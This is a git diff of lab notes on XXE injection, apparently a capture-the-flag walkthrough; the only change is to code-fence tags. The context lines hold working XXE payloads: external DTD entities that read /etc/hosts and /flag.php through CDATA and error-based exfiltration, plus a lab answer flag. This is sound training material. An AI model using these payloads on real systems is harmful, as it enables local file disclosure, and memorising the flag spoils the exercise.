@@ -2,7 +2,7 @@
 ## Advanced Exfiltration with CDATA
 To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
 
-```sh
+```shellsession
 $ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 $ python3 -m http.server 8000
 
@@ -24,7 +24,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ## Error Based XXE
 First, we will host a DTD file that contains the following payload:
 
-```sh
+```shellsession
 $ cat xxe.dtd
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
@@ -46,7 +46,7 @@ Now, we can call our external DTD script, and then reference the error entity, a
 ## Questions
 1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error'). **Answer: HTB{3rr0r5_c4n_l34k_d474}**
    - Use error based XXE at `/error` path, first host the `xxe.dtd`:
-        ```sh
+        ```shellsession
         $ cat xxe.dtd
         <!ENTITY % file SYSTEM "file:///flag.php">
         <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
